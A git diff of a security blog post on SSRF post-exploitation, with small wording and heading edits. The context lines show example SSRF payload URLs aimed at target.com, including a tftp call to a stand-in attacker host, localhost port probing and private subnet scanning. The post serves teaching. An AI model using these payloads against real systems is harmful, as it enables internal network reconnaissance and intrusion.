@@ -1,5 +1,5 @@
 # Welcome to the Blog!
-Hi! I'm Shubham Dubey and this is my first blog in which i will try to explain post exploitation techniques of old famous Web-Attacks.Let's start with SSRF and will continue the series.
+Hi! I'm Shubham Dubey and this is my first blog in which i will try to explain post exploitation techniques of old famous Web-Attacks.
 
 # SSRF
 
@@ -95,6 +95,7 @@ https://target.com/page?url=tftp://attacker.net:123456/TESTUDP`
 
 ### **Post Exploitation Methodology We Should Follow**
 - LDAP
+
 - GOPHER
 - Cross-Site Port Attack (XSPA)
 
@@ -146,6 +147,9 @@ https://target.com/page?url=http://localhost:PORT/`
 
 ![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/port.png)
   ![enter image description here](https://raw.githubusercontent.com/ShubhamDubeyy/Route-To-Toor/gh-pages/port2.png)
+   
+   ***Subnet Scan***  
+   
 Besides scanning for ports an attacker might also run a scan of running hosts by trying to ping private IP addresses:
 
 -   `**192.168.0.0/16**`
